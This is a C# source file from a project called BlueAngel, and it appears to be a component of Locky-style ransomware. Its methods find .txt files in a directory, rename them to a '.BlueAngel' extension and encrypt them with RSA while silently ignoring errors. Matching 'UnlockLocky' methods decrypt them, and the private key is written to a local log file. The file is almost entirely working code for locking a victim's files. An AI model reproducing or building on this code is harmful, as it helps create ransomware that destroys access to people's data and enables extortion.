using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace BlueAngel
{
    public class FileSystemOperation
    {
        /// <summary>
        /// File System Interactions
        /// </summary>
        /// 

        EncryptionOperation FileEncrypter = new EncryptionOperation();

        public void WriteLog(string logMessage)
        {
                    
            string exePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);

            try
            {
                using (StreamWriter w = File.AppendText(exePath + "\\" + "BlueAngel.log"))
                {
                    Log(logMessage, w);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("failed to log :/");
            }

        }


        public void LogKeyData(string privatekey, string publickey)
        {

            string currentdatetime = (DateTime.Now.ToString("yyyy-dd-M-HH-mm-ss") + "-KEY.log");
            var keylogfile = File.Create(currentdatetime);
            
            using (StreamWriter outputFile = new StreamWriter(keylogfile))
            {
                outputFile.WriteLine("Welcome to your BlueAngel Key Backup Log File!");
                outputFile.WriteLine("Private Key: " + privatekey);
                outputFile.WriteLine("Public Key: " + publickey);
            }
     
        }

        public void Log(string logMessage, TextWriter txtWriter)
        {
            try
            {
                logMessage = (DateTime.Now.ToLongTimeString() + " : " + logMessage);
                txtWriter.WriteLine(logMessage);

            }
            catch (Exception ex)
            {
            }
        }


        public void startstopFileDump()
        {

        }


        public FileInfo[] GetLockyFileCount(string path)
        {
            DirectoryInfo d = new DirectoryInfo(path);
            FileInfo[] Files = d.GetFiles("*.BlueAngel"); //Getting BlueAngel files
            return Files;
        }

       

        public FileInfo[] GetTXTFileCount (string path)
        {
            DirectoryInfo d = new DirectoryInfo(path);
            FileInfo[] Files = d.GetFiles("*.txt"); //Getting Txt files
            return Files;
        }

        public void LockTXTFile(FileInfo file)
        {
            string oldfilename = file.Name;
            string newfilename = (file.Name).Replace(".txt", ".BlueAngel");
            string oldfileExtension = file.Extension;
            string newfilefullname = (file.FullName).Replace(".txt", ".BlueAngel");

            try
            {
                System.IO.File.Move(file.Name, newfilename);
                FileEncrypter.EncryptFileRSA(newfilefullname);
            }
            catch
            {
                //can't touch this
            }
        }

        public void LockTXTFiles(string path)
        {
            DirectoryInfo d = new DirectoryInfo(path);
            FileInfo[] Files = d.GetFiles("*.txt"); //Getting Txt files
            
            foreach (FileInfo file in Files)
            {
                //Console.WriteLine(file.Name);
                string oldfilename = file.Name;
                string newfilename = (file.Name).Replace(".txt", ".BlueAngel");
                string oldfileExtension = file.Extension;
                string newfilefullname = (file.FullName).Replace(".txt", ".BlueAngel");

                try
                {
                    System.IO.File.Move(file.Name, newfilename);
                    FileEncrypter.EncryptFileRSA(newfilefullname);
                }
                catch
                {
                    //can't touch this
                }
                

            }
        }

        public void UnlockLockyFile(FileInfo file)
        {
            //Console.WriteLine(file.Name);
            string newfilename = (file.Name).Replace(".BlueAngel", ".txt");
            string newfilefullname = (file.FullName).Replace(".BlueAngel", ".txt");
            try
            {
                System.IO.File.Move(file.Name, newfilename);
                FileEncrypter.DecryptFileRSA(newfilefullname);

            }
            catch
            {
                //can't touch this
            }
        }

        public void UnlockLockyFiles(string path)
        {
            DirectoryInfo d = new DirectoryInfo(path);
            FileInfo[] Files = d.GetFiles("*.BlueAngel"); //Getting BlueAngel files
            
            foreach (FileInfo file in Files)
            {
                //Console.WriteLine(file.Name);
                string newfilename = (file.Name).Replace(".BlueAngel", ".txt");
                string newfilefullname = (file.FullName).Replace(".BlueAngel", ".txt");
                try
                {
                    System.IO.File.Move(file.Name, newfilename);
                    FileEncrypter.DecryptFileRSA(newfilefullname);

                }
                catch
                {
                    //can't touch this
                }

            }
        }

    }
}
